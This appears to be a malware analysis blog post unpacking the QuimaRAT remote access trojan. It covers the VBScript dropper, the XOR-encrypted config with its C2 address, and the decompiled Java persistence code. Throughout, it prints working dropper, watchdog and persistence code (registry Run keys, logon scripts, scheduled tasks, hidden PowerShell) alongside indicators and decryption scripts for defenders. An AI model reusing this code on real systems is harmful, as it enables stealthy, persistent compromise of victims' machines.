+++
title = "Unpacking QuimaRAT: From VBScript Dropper to a 255-Packet Offensive Framework"
date = 2026-07-22T00:00:00-00:00
draft = false
summary = "QuimaRAT is a new RAT being touted as a powerful cross-platform RAT capable of infecting Windows, MacOS, and Linux devices. While this is certainly true, it also happens to be quite an understatement. In this article we will unpack a VBScript dropper and analyze the subsequent JAR payload."
tags = ["deobfuscation-lab", "malware", "rat", "remote-access-trojan", "unpacking", "encryption"]
+++


## QuimaRAT Overview

QuimaRAT is an emerging Java-based Remote Access Trojan (RAT) that is currently circulating under a Malware-as-a-Service (MaaS) model, with its popularity owing in part to its framework's capability of targeting Windows, Linux, and MacOS devices. Its ability to target nearly every computing system in existence lies in its modular architecture that allows operators to dynamically expand functionality on the fly via encrypted plugins dropped from its underlying command and control (C2) infrastructure. Intel471 wrote up a quick synopsis of this RAT [here](https://go.intel471.com/hubfs/Emerging%20Threats/2026%20Emerging%20Threats/Intel%20471%20%7C%20Emerging%20Threat%20-%20QuimaRAT%20-%2007.15.2026.pdf?utm_content=382536237&utm_medium=social&utm_source=linkedin&hss_channel=lcp-3744600), while LevelBlue has a much more in depth article [here](https://www.levelblue.com/hubfs/Web/Library/Documents_pdf/Threat_Spotlight_An_In_Depth_Analysis_of_QuimaRAT.pdf) for more detailed analysis. While initial reporting on QuimaRAT describes it as a powerful, modular RAT tool, the analysis contained in this article proves it to be much more: QuimaRAT is essentially a **complete attack framework** with capabilities spanning the entire kill chain.  Following the analysis of this RAT, this article provides a full list of host- and network-based indicators, full MITRE ATT&CK mapping, and a sample KQL detection query for identifying potential QuimaRAT behavior in an environment. _**You can use the table of contents above to more easily navigate to sections of interest.**_

## The Initial VBScript Dropper

To begin, the sample analyzed here has a SHA256 hash `b60bf8c65bfee063e53cb392d5c8c62e63a5bd08cc4ea9494d35cafec918e372` and was found under the filename `ssa_document.vbs`. We will see the importance of this filename shortly. Being written in VBScript the dropper file was easily analyzed and upon opening, immediate red flags popped out suggesting malicious behavior: functions and subroutines named `CleanB64`, `B64Decode`, `WriteBytes`, `XorFileHex`, `ExtractPayload`, `InstallJre`, and more - all of which provide a pretty good picture of some expected behavior for this dropper in mere seconds. The main script logic covers roughly 235 lines, at which the payload, which we'll cover shortly, begins: a massive block of base64-encoded data commented out with single quotes `'`, filling just under 68,000 total lines in the dropper file. This payload block ends up being base64-encoded bytes for the next stage, a JAR file, which we'll get to momentarily. But first, let's now take a look at the 2 most interesting subroutines: `ExtractPayload` and `InstallJre`. We'll get our bearings first on both, then break them down.


### ExtractPayload
```vbscript
Sub ExtractPayload(fso, src, marker, dest, enc, key)
  Dim sh, t, b64Out, line, found, tmpB64, tmpBin, st, bytes
  Set sh = CreateObject("WScript.Shell")
  tmpB64 = fso.GetSpecialFolder(2) & "\" & fso.GetTempName()
  tmpBin = fso.GetSpecialFolder(2) & "\" & fso.GetTempName()
  Set b64Out = fso.CreateTextFile(tmpB64, True)
  b64Out.WriteLine "-----BEGIN CERTIFICATE-----"
  found = False
  Set t = fso.OpenTextFile(src, 1)
  Do While Not t.AtEndOfStream
    line = t.ReadLine
    If Not found Then
      If line = marker Then found = True
    Else
      If Left(line, 2) = "::" Then
        b64Out.WriteLine Mid(line, 3)
      ElseIf Left(line, 1) = "'" Then
        b64Out.WriteLine Mid(line, 2)
      End If
    End If
  Loop
  t.Close
  If Not found Then
    b64Out.Close: fso.DeleteFile tmpB64, True
    Exit Sub
  End If
  b64Out.WriteLine "-----END CERTIFICATE-----"
  b64Out.Close
  sh.Run "%ComSpec% /c certutil -f -decode """ & tmpB64 & """ """ & tmpBin & """ >nul 2>&1", 0, True
  If Not fso.FileExists(tmpBin) Then Exit Sub
  If enc Then
    XorFileHex fso, sh, tmpBin, dest, key
  Else
    Set st = CreateObject("ADODB.Stream")
    st.Type = 1: st.Open: st.LoadFromFile tmpBin
    bytes = st.Read: st.Close
    WriteBytes dest, bytes
  End If
  On Error Resume Next
  fso.DeleteFile tmpB64, True
  fso.DeleteFile tmpBin, True
  On Error GoTo 0
End Sub
```

For our purposes, the most important aspects of this `ExtractPayload` subroutine include the subroutine parameters it accepts named `marker`, `dest` and `enc`, as well as the short logic blocks that utilize these variables in the subroutine logic itself:

```vbscript
Do While Not t.AtEndOfStream
    line = t.ReadLine
    If Not found Then
      If line = marker Then found = True
    Else
      If Left(line, 2) = "::" Then
        b64Out.WriteLine Mid(line, 3)
      ElseIf Left(line, 1) = "'" Then
        b64Out.WriteLine Mid(line, 2)
      End If
    End If
  Loop
```
Note in this code block that the script reads itself after opening itself as the variable `t`, and iterates line by line until the `marker` is found, sets the `found` variable to true and then switches to the Else statement, storing each line of base64-encoded data in a randomly-named `.tmp` file created earlier in the subroutine via `  tmpB64 = fso.GetSpecialFolder(2) & "\" & fso.GetTempName()`. Certutil is then used following the complete base64 data write to convert the base64-encoded data in `tmpB64` to raw bytes in the `tmpBin` file - the file that now contains the actual payload data, another randomly-named `.tmp` file. We'll now quickly look at the next core logic block:

```vbscript
  If enc Then
    XorFileHex fso, sh, tmpBin, dest, key
  Else
    Set st = CreateObject("ADODB.Stream")
    st.Type = 1: st.Open: st.LoadFromFile tmpBin
    bytes = st.Read: st.Close
    WriteBytes dest, bytes
  End If
```
If the `enc` variable passed to `ExtractPayload` is true, it performs a simple repeating-key XOR cipher to decrypt the data. However, this block never executes because as we will see in the logic shortly, `ExtractPayload` does not get passed encoded data, at least in this sample. Instead, the _Else_ block executes, essentially reading the bytes from `tmpBin` and writing them to `dest` which, as we again will see momentarily, is the ultimate next stage of this payload.


### InstallJre
```vbscript
Sub InstallJre(fso, appDir, jreDir, urls)
  Dim zip, ext, ok, u, inner, f
  zip = appDir & "\jre_download.zip"
  ext = appDir & "\jre_extract"
  ok = False
  For Each u In urls
    If HttpSave(u, zip) Then
      If fso.FileExists(zip) Then
        If fso.GetFile(zip).Size > 1048576 Then
          ok = True
          Exit For
        End If
      End If
    End If
    If fso.FileExists(zip) Then fso.DeleteFile zip, True
  Next
  If Not ok Then Exit Sub
  If fso.FolderExists(ext) Then fso.DeleteFolder ext, True
  fso.CreateFolder ext
  UnzipTo zip, ext
  WScript.Sleep 3000
  If fso.FileExists(zip) Then fso.DeleteFile zip, True
  Set inner = Nothing
  For Each f In fso.GetFolder(ext).SubFolders
    Set inner = f
    Exit For
  Next
  If Not inner Is Nothing Then
    If fso.FolderExists(jreDir) Then fso.DeleteFolder jreDir, True
    fso.MoveFolder inner.Path, jreDir
  End If
  If fso.FolderExists(ext) Then fso.DeleteFolder ext, True
End Sub
```
The `InstallJre` subroutine provides the structure for this dropper to reach out and grab a standalone Java runtime (JRE) if it does not already exist on the target host. Notably, this contains a couple hardcoded IoCs pertaining to both the `.zip` file the file places the remotely-grabbed binary in, as well as the parent folder it gets subsequently extracted to: `jre_download.zip` and `jre_extract`.

With the main setup out of the way, the script execution is really quite simple, and outlined below. All that is excluded with the first [SNIP] is version checking on the currently installed java binary, if installed, to ensure it falls within the acceptable versions needed by this dropper. The second [SNIP] trims the payload data which, as mentioned, proceeds for the rest of the script to nearly 68,000 lines.

### Core Script Execution Logic

```vbscript
Dim o66fbbe, o3b6567, appDir, jreDir, javaBin, tempDir, jarPath
Dim foundJava, sOut, arrLines, ln, p1, p2, ver, pts, maj, mn, jvExec, ret
Set o66fbbe = CreateObject("WScript.Shell")
Set o3b6567 = CreateObject("Scripting.FileSystemObject")
appDir = o66fbbe.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\.ssadocument"
If Not o3b6567.FolderExists(appDir) Then o3b6567.CreateFolder appDir
jreDir = appDir & "\jre"
javaBin = jreDir & "\bin\javaw.exe"
tempDir = o3b6567.GetSpecialFolder(2).Path & "\~" & o3b6567.GetTempName()
o3b6567.CreateFolder tempDir
jarPath = tempDir & "\r.jar"

Call ExtractPayload(o3b6567, WScript.ScriptFullName, "'__PAYLOAD__", jarPath, false, "")
If Not o3b6567.FileExists(jarPath) Then
    o3b6567.DeleteFolder tempDir, True
    WScript.Quit 1
End If
foundJava = ""

. . . [SNIP] . . .

If foundJava = "" Then
    Dim urls: urls = Array("https://api.adoptium.net/v3/binary/latest/17/ga/windows/x64/jre/hotspot/normal/eclipse","https://cdn.azul.com/zulu/bin/zulu17.54.21-ca-jre17.0.13-win_x64.zip","https://corretto.aws/downloads/latest/amazon-corretto-17-x64-windows-jre.zip")
    Call InstallJre(o3b6567, appDir, jreDir, urls)
    If o3b6567.FileExists(javaBin) Then foundJava = javaBin
End If
If foundJava = "" Then
    o3b6567.DeleteFolder tempDir, True
    WScript.Quit 1
End If
o66fbbe.Run """" & foundJava & """ -Xmx256m -jar """ & jarPath & """", 0, False
WScript.Quit 0
' xHWX5Ar6JQh6 NUIn onHxNADV Ykxgse9uNu3
' gv8WUzU tGwavKpFfu ya6DinLraoSe qLK fjffDFHc UMsYtoz7b iTcxigJ U2Uap3zsN4j
' E7m0FoVwihG YakGH8T 0g08ss8JXfs1 IlGV7kiM IV21WKysN
'__PAYLOAD__
'UEsDBBQACAgIAMKd6FwAAAAAAAAAAAAAAAAUAAAATUVUQS1JTkYvTUFOSUZFU1QuTUY9j81ygjAY
'RffM8A68QBiQBAxLaEfFpiow4HQXyQdNA+gkOP48fXHR7u+cew7jo2zBTKgCbeR5jB3f9Wwr1cAn
'ECh5xM45iQz52lbg602t11JN9/ObPHgn3XV5SYK8rFe2lVxlL1AmFCou0MyYyLYYlyNKe27MTNGd
'K++KeE9X96FwJzW6N82Fsq0jSneMvX+WsUNombViP10ZUWH+oUEdH+tvnNVBNRR7Y7rgcJsM/P9t

. . . [SNIP] . . .
```

As can be seen the main execution logic of this dropper script contains more useful IoC data that defenders can hunt on. To begin, we note the expansion of the %LOCALAPPDATA% environment variable to create the hidden great-grandparent directory for the java binary named **.ssadocument**, with the full path for the binary becoming `C:\Users\<username>\AppData\Local\.ssadocument\jre\bin\javaw.exe`. This is an abnormal directory for the legitimate `javaw.exe` binary to be placed in, and any detection of this folder path existing should be considered evidence of execution of this specific dropper on the affected device. Likewise, the malicious JAR file ends up in the file path `C:\Users\<username>\AppData\Local\Temp\~<randomValue>\r.jar`, saved as the `jarPath` variable. Another indicator of compromise if seen on an endpoint. Skipping over the `ExtractPayload` call for just a brief moment, we can note three more hardcoded IoCs in this sample - the JRE CDN endpoints `api.adoptium.net`, `cdn.azul.com`, and `corretto.aws`. Defenders should monitor for web requests to these endpoints spawned by `wscript.exe` and writing data to the aforementioned files and folder paths.

We now turn our attention back to the `ExtractPayload` subroutine call. As a reminder, this subroutine was declared to accept the following parameters: `Sub ExtractPayload(fso, src, marker, dest, enc, key)`. Noting the parameters highlighted earlier, `marker`  = `'__PAYLOAD__`, `jarPath` is the path of the malicious `r.jar` file highlighted in the previous paragraph, and somewhat oddly, `enc` == `false`, so the XOR decryption routine declared earlier in this script actually never gets used in this particular sample. In short, the `ExtractPayload` call now base64 decodes the complete encoded payload beginning with the line `__PAYLOAD__`, and writes all of the decoded data to the `r.jar` file previously identified. Those who have worked with previous encoded archive files will be quick to note the base64-encoded data beginning with `UEs`, which decodes to the value `PK`, the beginning magic bytes that identify `.zip` archives (which is all a `.jar` file is) in recognition of their creator, Phil Katz. We can safely extract the payload from this VBScript dropper by creating a short PowerShell script that pulls each line of base64-encoded data, decodes it, and writes the raw bytes to an output file we'll call `payload.jar`. Given that this dropper finishes its work by executing this newly dropped `.jar` file, we'll now turn our attention there.

**PowerShell Script:**
```powershell
$src = "dropper.vbs"; $out = "payload.jar"; $marker = "'__PAYLOAD__"
$found = $false
$b64 = [System.Text.StringBuilder]::new()
foreach ($line in Get-Content $src) {
    if (-not $found) { if ($line -eq $marker) { $found = $true }; continue }
    if ($line.StartsWith("'")) { [void]$b64.Append($line.Substring(1)) }
}
[IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($b64.ToString()))
```

## Digging Into the JAR Payload

After extracting the contents of the `.jar` file to a folder we called `payload`, we first note the `MANIFEST.MF` file which immediately tells us a wealth of information about this code:

```
Manifest-Version: 1.0
Created-By: oB7s5ZKVe1rIWrHiktxoDiQ0brggRT53RTWG
Build-Jdk-Spec: 17
Main-Class: org.ixk50z.rl6d.tkn.wradk
X-COMMENT: 59TJfdPtuM5k6RLrekXyHh4JW3VmSPssg3QwtseG
Build-Id: ed447756-af45-4496-945e-437f4c6b0c91
Build-Timestamp: 1783565120950
X-Seed: 924e8JGMJOR475CjKBfJ4iz

```
The lines `Created-By: oB7s5ZKVe1rIWrHiktxoDiQ0brggRT53RTWG`, `X-COMMENT: 59TJfdPtuM5k6RLrekXyHh4JW3VmSPssg3QwtseG`, and `X-Seed: 924e8JGMJOR475CjKBfJ4iz` are all evidence of a name-mangler-like tool being used, such as Allatori or ProGuard. Even more useful to us is the random package/class chain: `Main-Class: org.ixk50z.rl6d.tkn.wradk`, which tells us further code obfuscation is at play in this second stage of the payload as well. The build timestamp `1783565120950` decodes from Epoch time to Thursday, July 9th, 2026 18:45:20 UTC, confirming that this sample is fresh. The `config.dat` file is known to contain a wealth of hardcoded information such as C2 hosts/ports, campaign IDs, encryption keys, install options, and more, however attempting to view this file reveals it is encrypted, so we'll table it for now and come back to it in a bit.

To further inspect individual classes, we now decompile the `payload.jar` file back into human-readable Java source code by use of the **Class File Reader** (`CFR.jar`) tool into a new folder we call `src`:

```java
java -jar cfr-0.152.jar payload.jar --outputdir src
```
To try to identify where the `config.dat` file is used in the actual Java source code, we can navigate into our newly decompiled `src` directory and use some simple PowerShell regex to look for it:

```powershell
Get-ChildItem -Recurse | Select-String -Pattern "config\.dat"

org\ixk50z\rl6d\uxers.java:70:        try (InputStream inputStream = uxers.class.getResourceAsStream("/config.dat");){

```

With `org\ixk50z\rl6d\uxers.java` identified as our file of interest that does the decrypting of `config.dat`, we open it up and notice that it contains a function named `load()`, highly likely to be the config parser: Not only does it call a decryption function `xorTransform`, but it also contains a wealth of variable names most likely to store decrypted variables in `config.dat`:

**Code block surrounding `xorTransform`:**
```java
int n;
ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
byte[] byArray = new byte[4096];
while ((n = inputStream.read(byArray)) != -1) {
    byteArrayOutputStream.write(byArray, 0, n);
}
byte[] byArray2 = byteArrayOutputStream.toByteArray();
byte[] byArray3 = uxers.xorTransform(byArray2);
String string = new String(byArray3, StandardCharsets.UTF_8);
JsonObject jsonObject = JsonParser.parseString(string).getAsJsonObject();
```

**Variable names further declared in this function:** `HOSTS`, `SERVER_ID`, `INSTALL_START`, `INSTALL_COM_HIJACK`, `ANTI_VM`, `ENABLE_WATCHDOG`, `FILE_NAME`, `SPOOF_JA3`, `DOH_DOMAIN`, `CERT_HASH`, `PASTEBIN_URL` and more. Before we even get to decrypting the `config.dat` file, these variable names alone provide insight into the rich modern feature set this RAT carries with it: DNS over HTTPS (DoH) for stealth and defense evasion, Anti-VM detections to prevent forensics, and JA3 fingerprint spoofing for further defense evasion.

Pivoting to identify the `xorTransform` function, we find it declared in the same `uxers.java` file near the end of the code. It is a simple _Repeating-Key XOR Cipher_ as evidenced by iterating over the length of the byte array, and rotating through each individual byte value of the key defined simply as `a`. As a quick aside before we carry on to decrypting `config.dat`, it is noteworthy to call out that nearly every single function declared in each Java file in this sample contains the same obfuscation junk code as seen at the top of the below function declaration. We see the `if` block performing some basic arithmetic resulting in the boolean value of `false`, followed by an empty logic block. This is a type of code obfuscation known as an _**Opaque Predicate**_ - a conditional statement used to inject junk code control flow to make automated analysis and signature matching more difficult. In this sample, every single function declaration begins with such an opaque predicate, each of which always evaluates to false (via some form of two positive, random integers multiplied against each other and evaluated as being <= 0) so, even if the junk `if` statement contained code, it would never execute.

```java
public static byte[] xorTransform(byte[] byArray) {
    if (77 * 103 <= 0) {
    }
    byte[] byArray2 = new byte[byArray.length];
    for (int i = 0; i < byArray.length; ++i) {
        byArray2[i] = (byte)(byArray[i] ^ a[i % a.length]);
    }
    return byArray2;
}
```

Now that we've identified the variable named `a` as being the XOR key necessary to perform the XOR decryption above, we find its declaration in the code and can now finally decrypt `config.dat`.

**XOR decryption key:**

```java
public static final byte[] a = new byte[]{-59, -30, 127, 24, 22, 14, 30, 29, 83, -3};
```

**Simple Python XOR decryptor pointed at `config.dat`, noting that Java bytes are signed so the negatives must be converted to unsigned values:**

```python
key = bytes([0xC5, 0xE2, 0x7F, 0x18, 0x16, 0x0E, 0x1E, 0x1D, 0x53, 0xFD])
data = open("config.dat", "rb").read()
out = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
open("config.json", "wb").write(out)
print(out.decode("utf-8", "replace"))
```

**Final decrypted `config.dat`:**
```json
{
    "targetOs": "windows",
    "hosts": [
        {
            "ip": "147.124.222.192",
            "port": 4445,
            "transport": "SSL"
        },
        {
            "ip": "147.124.222.192",
            "port": 443,
            "transport": "WEBSOCKET"
        }
    ],
    "serverId": "CLIENT",
    "delay": 2,
    "installReg": true,
    "installSch": false,
    "installStart": false,
    "installComHijack": false,
    "installPersist": true,
    "antiVm": false,
    "enableWatchdog": true,
    "throttleTraffic": false,
    "spoofJa3": false,
    "manifestCreatedBy": "oB7s5ZKVe1rIWrHiktxoDiQ0brggRT53RTWG",
    "manifestComment": "59TJfdPtuM5k6RLrekXyHh4JW3VmSPssg3QwtseG",
    "fileName": "ssa_document.lib",
    "folder": "SlackData",
    "regName": "WindowsPatch",
    "pluginBaseHash": "32e0ac6473bfa854f777bdca6be1b2282ebaff7379ae256756cbb113b5525efa",
    "certHash": "f1c55b6ab06cce7d2adf5e3dcb544af3827c0dfdebde2c3ad702c1c5ca2c36ec"
}
```

**`config.dat` IoC table:**

|Indicator|Type|Comments|
| ----- | ----- | ----- |
|147.124.222.192|C2|Hardcoded, dual-channel C2 address. Block & hunt.|
|installReg & installPersist|Persistence|Highly suggestive of registry Run key creation. Hunt registry run key creation.|
|regName: WindowsPatch|File creation|Used for file creation & persistencel examples shown below in article. Can be modified by actor; low fidelity on pyramid of pain. Hunt folder path.|
|folder: SlackData|Folder creation|`folder` variable in config file. Can be modified by actor; low fidelity on pyramid of pain. Hunt folder path.|
|ssa_document.lib|File creation|Likely lands in %AppData%\SlackData\ssa_document.lib. Can be modified by actor; low fidelity on pyramid of pain. Hunt file name.|
|certHash: f1c55b6ab06cce7d2adf5e3dcb544af3827c0dfdebde2c3ad702c1c5ca2c36ec|C2|Pinned C2 TLS cert. Network IoC.|
|pluginBaseHash: 32e0ac6473bfa854f777bdca6be1b2282ebaff7379ae256756cbb113b5525efa|Plugin Feature|Suggestive of a plugin system for added functionality. Plugins likely fetched from C2 as remote JARs.|

Now that we have `config.dat` decrypted, we can turn our attention to the actual Java files in this JAR payload.

## Core Java Payload Files

### wickrrkm.java

We'll begin by looking at the file `wickrrkm.java` in the path `\src\org\ixk50z\rl6d\xmju\wickrrkm.java`. We chose this file first by running some recursive regex on the `src` parent folder looking for `Runtime.getRuntime().exec`, a Java shell execution command that we'd expect to see in some of the files carrying the bulk of the malicious workload. Viewing this file, we indeed see numerous instances of this shell execution being performed on some further encoded commands. This time, the authors chose to obfuscate their code to prevent against static string analysis by hiding individual characters behind some basic arithmetic, with the code dynamically building its commands at runtime by evaluating decimal values to determine individual ASCII characters, and appending those individual characters into the full command text. One such example of this can be seen in the declaration of the function `g()`:

```java
public static void g() {
  String string;
  if (63 * 105 <= 0) {
  }
  try {
      Runtime.getRuntime().exec(new String[]{new StringBuffer().append((char)(297 - 198)).append((char)(310 - 201)).append((char)(304 - 204)).append((char)(253 - 207)).append((char)(311 - 210)).append((char)(333 - 213)).append((char)(317 - 216)).toString(), String.valueOf(new char[]{(char)(241 - 194), (char)(296 - 197)}), String.valueOf(new char[]{(char)(251 - 132), (char)(244 - 135), (char)(243 - 138), (char)(240 - 141), (char)(176 - 144), (char)(259 - 147), (char)(264 - 150), (char)(264 - 153), (char)(255 - 156), (char)(260 - 159), (char)(277 - 162), (char)(280 - 165), (char)(200 - 168), (char)(290 - 171), (char)(278 - 174), (char)(278 - 177), (char)(294 - 180), (char)(284 - 183), (char)(218 - 186), (char)(223 - 189), (char)(270 - 192), (char)(292 - 195), (char)(307 - 198), (char)(302 - 201), (char)(265 - 204), (char)(246 - 207), (char)(329 - 210), (char)(328 - 213), (char)(315 - 216), (char)(333 - 219),
. . . [SNIP] . . .
```

Two methods are used to perform this dynamic runtime compilation: `append()` and `appendCodePoint()`. We can defeat this obfuscation easily by making use of a Python script to parse the code and return the cleartext decoded strings. I've made the Python script that I created for this task available [on my deobfuscation tooling GitHub repo here](https://github.com/tilde-d/unpacked/tree/main/quimarat-dropper). After parsing with the Python script, the above obfuscated block (we'll add the entire `try{}` block here, which was truncated above) decodes to:

```java
public static void g() {
  String string;
  try {
      Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "wmic process where \"Name='wscript.exe' AND CommandLine LIKE '%sys_wd.vbs%'\" call terminate >nul 2>&1"}).waitFor();
  }
```

The above decoded command appears to be performing some cleanup on a file called `sys_wd.vbs` executed with `wscript.exe`. So far, the only VBScript filename we've identified has been `ssa_document.vbs` - the name of the dropper - so this filename is new at this point. That being said, it's worth noting that we can recall the `config.dat` file above containing a line named `enableWatchdog` set to `true` - the 'wd' in `sys_wd.vbs` could be referring to watchdog functionality of the payload. Noting this for later, we can see 2 similar instances of termination attempts for this process in other areas of the code:

```java
try {
    Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "taskkill /F /IM wscript.exe /FI \"COMMANDLINE LIKE %%sys_wd.vbs%%\" >nul 2>&1"}).waitFor();
}

. . . [SNIP] . . .

try {
    string = "Get-CimInstance Win32_Process -Filter \"Name='wscript.exe'\" | Where-Object { $_.CommandLine -like '*sys_wd.vbs*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }";
    String string2 = Base64.getEncoder().encodeToString(string.getBytes(StandardCharsets.UTF_16LE));
    new ProcessBuilder("powershell.exe", "-nop", "-ep", "bypass", "-w", "hidden", "-EncodedCommand", string2).start().waitFor();
}

```

To prevent this from turning into a novel, we're going to speed up a bit now and only highlight other useful activity and indicators performed by this payload. Sticking with `wickrrkm.java` still, we also observe:

Windows persistence via a somewhat unique registry key `UserInitMprLogonScript` (`file2` = `sys_wd.vbs`):
```java
try {
  object = Runtime.getRuntime().exec(new String[]{"reg", "add", "HKCU\\Environment", "/v", "UserInitMprLogonScript", "/t", "REG_SZ", "/d", "wscript.exe //B //Nologo \"" + file2.getAbsolutePath() + "\"", "/f"});
  ((Process)object).waitFor();
}
```

Drops a VBS watchdog (as suspected earlier) to `%APPDATA%\Microsoft\Windows\Templates\sys_wd.vbs` and drops a watchdog stopping mechanism called `.wd_stop`:
```java
if ((string2 = System.getenv("APPDATA")) == null) {
    string2 = System.getProperty("java.io.tmpdir");
}
if (!(file = new File(string2, "Microsoft\\Windows\\Templates")).exists()) {
    file.mkdirs();
}
File file2 = new File(file, "sys_wd.vbs");
String string3 = qjvyazwzp.b();
String string4 = new File(string).getName();
String string5 = file.getAbsolutePath() + "\\.wd_stop";
String string6 = "Set objWMI = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\nSet objShell = CreateObject(\"WScript.Shell\")\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\ntargetFile = LCase(\"" + string4 + "\")\ntargetExe = \"" + string + "\"\njavaExe = \"" + string3 + "\"\nkillSwitch = \"" + string5 + "\"\n\nFunction IsTargetAlive()\n    IsTargetAlive = False\n    Set procs = objWMI.ExecQuery(\"Select ProcessID, CommandLine From Win32_Process\")\n    For Each p In procs\n        If Not IsNull(p.CommandLine) Then\n            If InStr(1, LCase(p.CommandLine), targetFile, 1) > 0 Then\n                IsTargetAlive = True\n                Exit For\n            End If\n        End If\n    Next\nEnd Function\n\nDo\n    If objFSO.FileExists(killSwitch) Then\n        WScript.Quit\n    End If\n    WScript.Sleep 15000\n    If objFSO.FileExists(killSwitch) Then\n        WScript.Quit\n    End If\n    If Not IsTargetAlive() Then\n        ext4 = LCase(Right(targetExe, 4))\n        If ext4 = \".exe\" Or ext4 = \".bat\" Or ext4 = \".cmd\" Then\n            objShell.Run Chr(34) & targetExe & Chr(34), 0, False\n        ElseIf ext4 = \".vbs\" Then\n            objShell.Run \"wscript.exe //B //Nologo \" & Chr(34) & targetExe & Chr(34), 0, False\n        Else\n            objShell.Run Chr(34) & javaExe & Chr(34) & \" -jar \" & Chr(34) & targetExe & Chr(34), 0, False\n        End If\n        WScript.Sleep 10000\n    End If\nLoop\n";
Files.write(file2.toPath(), string6.getBytes("UTF-8"), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
```
In plain language, we have now confirmed that `sys_wd.vbs` is the watchdog, and `.wd_stop` is the coordination mechanism to help the payload determine that, if the process is found to not be running, whether the process ending was intentional by the code, or if the process terminated unexpectedly. If it terminated unexpectedly, no `.wd_stop` exists, and the payload will spin the watchdog back up. However if `.wd_stop` does exist and the process has exited, the code knows this was intentional, and does not respawn the watchdog process.

### qjvyazwzp.java

In the previous `wickrrkm.java` file, we saw references to another file - `\src\org\ixk50z\rl6d\jg\qjvyazwzp.java`. We'll go ahead and dig into this next. Opening it reveals it has been obfuscated with the same `append()` and `appendCodePoint()` methods as previously, so we'll first clean it up with the Python script used above.  Once cleaned, we open it up and find we are dealing with some further obfuscation leveraging fixed-key XOR encryption against the hardcoded key `0x37`:
```java
public static String a(int ... nArray) {
    char[] cArray = new char[nArray.length];
    for (int i = 0; i < nArray.length; ++i) {
        cArray[i] = (char)(nArray[i] ^ 0x37);
    }
    return new String(cArray);
}
```

Upon decryption, we are met with a handful of further persistence mechanisms employed by the payload: a run key addition, a scheduled task creation, and Startup folder addition.  First, recall the `regName` value in `config.dat` being `WindowsPatch`. The `b()` method pulls this and drops it to all lowercase to be used in the future method calls. While there is more to this method below, it essentially all deals with helping the payload find the proper `java.exe` or `javaw.exe` binary for code execution:
```java
public static String b() {
  File file;
  Object object;
  String string = uxers.REG_NAME.toLowerCase().replaceAll("[^a-z0-9]", "");
  String string2 = System.getenv("LOCALAPPDATA");
  String string3 = "javaw" + (".exe");
  String string4 = "java.exe";
  if (string2 != null) {
    object = new File(string2, "." + string + File.separator + "jre" + File.separator + "bin" + File.separator + string3);

. . . [SNIP] . . .        
```

Worth noting, the above code blocks actually refine the earlier install path we uncovered via the hardcoded value of `.ssadocument` in the original VBScript dropper file. We can now see that we can expect to see the java/javaw binary existing in the path `\%LOCALAPPDATA%\.windowspatch\jre\bin\javaw.exe`. This is yet another folder path to hunt in the environment.

Additional persistence mechanisms:
```java
public static void b(String string, String string2) throws Exception {
    String string3 = "reg add" + " " + "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" + " " + "/v" + " \"" + string2 + "\" " + "/t" + " " + "REG_SZ" + " " + "/d" + " \"\\\"" + qjvyazwzp.b() + ("\\\" ") + "-Xmx128m" + " " + "-jar" + " \\\"" + string + ("\\\"\" ") + "/f";
    bnzkl.a(new String[]{"cmd.exe", "/c", string3});
}

public static void c(String string, String string2) throws Exception {
    String string3 = qjvyazwzp.b();
    String string4 = "$a = New-ScheduledTaskAction -Execute '\"" + string3 + "\"' -Argument '" + "-Xmx128m" + " " + "-jar" + " \"\"" + string + "\"\"';$t = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME;$s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0;" + "Register-ScheduledTask" + " -TaskName '" + string2 + "' -Action $a -Trigger $t -Settings $s -Force";
    bnzkl.a(new String[]{"powershell.exe", "-WindowStyle", "Hidden", "-Command", string4});
}

public static void d(String string, String string2) throws Exception {
    String string3 = System.getenv("APPDATA") + "\\" + "Microsoft" + "\\" + "Windows" + "\\" + "Start Menu\\Programs\\Startup";
    new File(string3).mkdirs();
    String string4 = "@echo off\r\nstart \"\" /min \"" + qjvyazwzp.b() + "\" -jar \"" + string + "\"\r\n";
    Files.write(new File(string3, string2 + ".bat").toPath(), string4.getBytes(StandardCharsets.UTF_8), new OpenOption[0]);
}
```

A complete cleanup method also exists in this part of the payload under the `e()` method. The below top portion of the method can be seen removing the previously covered persistence mechanism artifacts. Additionally, the complete method body points to a handful of additional useful indicators not yet seen in the code.

```java
public static void e() throws Exception {
    File file;
    bnzkl.a(new String[]{"reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", uxers.REG_NAME, "/f"});
    bnzkl.a(new String[]{"reg", "delete", "HKCU\\Environment", "/v", "UserInitMprLogonScript", "/f"});
    bnzkl.a(new String[]{"schtasks", "/delete", "/tn", uxers.REG_NAME, "/f"});
    String string = System.getenv("APPDATA") + "\\" + "Microsoft" + "\\" + "Windows" + "\\" + "Start Menu\\Programs\\Startup";
    Files.deleteIfExists(Paths.get(string, uxers.REG_NAME + (".bat")));
    Files.deleteIfExists(Paths.get(string, uxers.REG_NAME + ".lnk"));

. . . [SNIP] . . .
```

Additional new indicators: `%APPDATA%\.cache\plugins`, a cache where the modular components of the RAT are stored, `%LOCALAPPDATA%\Microsoft\Windows\Caches\plg`, a secondary plugin cache, `%APPDATA%\QuimaLogs\` and `%APPDATA%\QuimaLogs\.offline_enabled`, a data exfil queue, which serves to also store data for exfil in the event the C2 server cannot be reached by the RAT.

The RAT also performs anti-forensics and anti-VM checks. Inside the `j()` method, the code checks for any number of processes, including but not limited to the following:
1. VM guest tool processes: `vboxservice/vboxtray`, `vmtoolsd/vmwaretray/vmwareuser`, `vmuservc/vmsrvc`, `qemu-ga`
1. Analysis tool processes: `wireshark`, `fiddler`, `dumpcap`, `processhacker`, `procmon`, `procexp`, `autoruns`, `ollydbg`, `x64dbg`, `x32dbg`, `importrec`, `petools`, `lordpe`, `cuckoomon.dll`
